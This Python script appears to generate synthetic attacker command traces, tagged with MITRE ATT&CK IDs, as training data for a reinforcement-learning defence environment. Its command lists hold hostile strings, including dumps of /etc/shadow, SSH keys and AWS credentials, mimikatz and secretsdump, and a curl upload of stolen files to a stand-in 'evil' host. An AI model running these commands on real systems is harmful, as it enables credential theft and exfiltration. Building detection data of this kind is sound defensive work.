#!/usr/bin/env python3
"""
Synthetic attacker trace generator for Maya RL training.

Produces JSONL / pickle files that look like real MITRE Caldera / Empire / Sliver output.
Each trace is a sequence of (command, ttp-ish, timing) steps with an overall "sophistication" label.

These traces drive the Gymnasium environment so the PPO policy learns realistic behavior.

Usage (from rl-training/):
    python -m rl_training.data_generator --num-episodes 3000 --out data/synthetic/
"""

from __future__ import annotations

import argparse
import json
import random
from pathlib import Path
from typing import List, Dict, Any
import numpy as np


RECON_CMDS = [
    "whoami", "id", "uname -a", "cat /etc/os-release", "hostname",
    "netstat -an", "ss -tuln", "ip addr", "ip route", "arp -a",
    "ps aux | head -20", "cat /etc/passwd", "ls -la /home", "find / -name '*.conf' 2>/dev/null | head -5",
    "cat /proc/version", "last -n 5",
]

PRIV_ESC_CMDS = [
    "sudo -l", "sudo su -", "cat /etc/sudoers", "find / -perm -4000 2>/dev/null",
    "kernel exploit attempt (dirtypipe)", "pkexec --version",
]

CRED_CMDS = [
    "cat /etc/shadow", "cat ~/.ssh/id_rsa", "mimikatz sekurlsa::logonpasswords",
    "lsadump::sam", "grep -i password /var/www/html/wp-config.php",
    "cat /root/.aws/credentials",
]

LATERAL_CMDS = [
    "ssh user@10.20.20.21", "ssh admin@fake-db-01", "scp loot.tar user@10.20.20.30:/tmp/",
    "net use \\\\10.20.20.40\\c$", "psexec \\\\fake-web-02 -u admin -p Winter2023! cmd.exe",
]

SUSPICIOUS = [
    "bloodhound-python -c All", "crackmapexec smb 10.20.20.0/24 -u admin",
    "secretsdump.py -just-dc", "rubeus.exe dump",
]

EXFIL = [
    "tar czf /tmp/loot.tar /etc /home /root", "curl -F 'file=@/tmp/loot.tar' http://evil/recv",
    "python3 -c 'import socket,subprocess,os; ...' | base64",
]


def generate_trace(sophistication: float, length: int | None = None, profile: str | None = None) -> Dict[str, Any]:
    """
    Generate a trace. profile can be 'scripted_bot' (fast, repetitive, low entropy)
    or 'careful_agent' (slower, higher variety, targeted TTPs). If None, derived from sophistication.
    """
    if profile is None:
        profile = "scripted_bot" if sophistication < 0.45 else "careful_agent"

    if length is None:
        if profile == "scripted_bot":
            length = int(8 + sophistication * 22 + random.gauss(0, 3))
        else:
            length = int(15 + sophistication * 35 + random.gauss(0, 4))
        length = max(8, min(70, length))

    steps: List[Dict[str, Any]] = []
    t = 0.0
    recon = 0
    priv = 0
    cred = 0
    lat = 0
    susp = 0
    ex = 0

    is_scripted = profile == "scripted_bot"

    for i in range(length):
        r = random.random()
        if is_scripted:
            # Scripted bots: lots of noisy recon early, repetitive, then blind lateral attempts
            if r < 0.72:
                cmd = random.choice(RECON_CMDS)
                recon += 1
                ttp = "T1082"
            elif r < 0.88:
                cmd = random.choice(PRIV_ESC_CMDS + CRED_CMDS)
                if "sudo" in cmd or "cat /etc" in cmd:
                    priv += 1
                else:
                    cred += 1
                ttp = "T1068" if priv else "T1003"
            else:
                cmd = random.choice(LATERAL_CMDS)
                lat += 1
                ttp = "T1021"
            # Fast regular intervals for bots
            delta = max(0.8, np.random.exponential(4.5 - sophistication * 1.5))
        else:
            # Careful / "AI-like" : deliberate recon, then targeted escalation + lateral, higher entropy
            if r < 0.48 + sophistication * 0.15:
                cmd = random.choice(RECON_CMDS)
                recon += 1
                ttp = "T1082" if "whoami" in cmd or "uname" in cmd else "T1049"
            elif r < 0.68 + sophistication * 0.12:
                cmd = random.choice(PRIV_ESC_CMDS)
                priv += 1
                ttp = "T1068"
            elif r < 0.82 + sophistication * 0.1:
                cmd = random.choice(CRED_CMDS)
                cred += 1
                ttp = "T1003"
            elif r < 0.93:
                cmd = random.choice(LATERAL_CMDS + SUSPICIOUS)
                lat += 1
                if "bloodhound" in cmd or "crackmap" in cmd:
                    susp += 1
                ttp = "T1021"
            else:
                cmd = random.choice(EXFIL)
                ex += 1
                ttp = "T1041"
            # More variable, often slower for careful attackers
            delta = max(2.0, np.random.exponential(11.0 - sophistication * 5.5))

        t += delta

        steps.append({
            "t": round(t, 1),
            "cmd": cmd,
            "ttp": ttp,
            "recon": recon,
            "priv_esc": priv,
            "cred_access": cred,
            "lateral": lat,
            "suspicious_tools": susp,
            "exfil": ex,
            "profile": profile,
        })

    return {
        "sophistication": round(sophistication, 3),
        "profile": profile,
        "length": len(steps),
        "total_time": round(t, 1),
        "steps": steps,
    }


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--num-episodes", type=int, default=1500)
    parser.add_argument("--out", type=Path, default=Path("data/synthetic"))
    parser.add_argument("--seed", type=int, default=42)
    args = parser.parse_args()

    random.seed(args.seed)
    np.random.seed(args.seed)

    out_dir = args.out
    out_dir.mkdir(parents=True, exist_ok=True)

    traces: List[Dict[str, Any]] = []
    profiles = ["scripted_bot", "careful_agent"]
    for i in range(args.num_episodes):
        soph = random.choice([0.22, 0.35, 0.48, 0.62, 0.75, 0.88])
        if random.random() < 0.12:
            soph = min(0.96, soph + random.random() * 0.1)

        profile = random.choice(profiles)
        # scripted bots tend lower soph, careful higher
        if profile == "scripted_bot" and soph > 0.55:
            soph *= 0.7
        elif profile == "careful_agent" and soph < 0.4:
            soph = min(0.92, soph + 0.25)

        trace = generate_trace(soph, profile=profile)
        trace["id"] = f"trace_{i:05d}"
        traces.append(trace)

        # Write individual files too (nice for inspection)
        with open(out_dir / f"{trace['id']}.json", "w") as f:
            json.dump(trace, f, indent=2)

    # Also write a single big file for fast loading in the trainer
    with open(out_dir / "all_traces.jsonl", "w") as f:
        for t in traces:
            f.write(json.dumps(t) + "\n")

    print(f"Generated {len(traces)} traces → {out_dir}")
    print(f"  Mix of 'scripted_bot' (fast/repetitive) and 'careful_agent' (targeted/varied) profiles")


if __name__ == "__main__":
    main()
